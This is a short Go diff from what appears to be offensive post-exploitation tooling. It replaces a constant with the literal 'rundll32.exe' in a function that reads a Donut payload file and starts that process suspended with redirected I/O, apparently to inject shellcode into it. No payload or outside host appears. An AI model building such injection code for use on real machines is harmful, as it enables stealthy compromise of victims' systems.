@@ -29,7 +29,7 @@ const COMMANDLINE = "rundll32.exe"
 func (d *Donut) Run(command string, timeout int) ([]byte, string, string) {
 	bytes, _ := ioutil.ReadFile("something.donut")
 
-	handle, pid, stdout, stderr := CreateSuspendedProcessWithIORedirect(COMMANDLINE)
+	handle, pid, stdout, stderr := CreateSuspendedProcessWithIORedirect("rundll32.exe")
 
 	//Setup variables
 	stdoutBytes := make([]byte, 1)
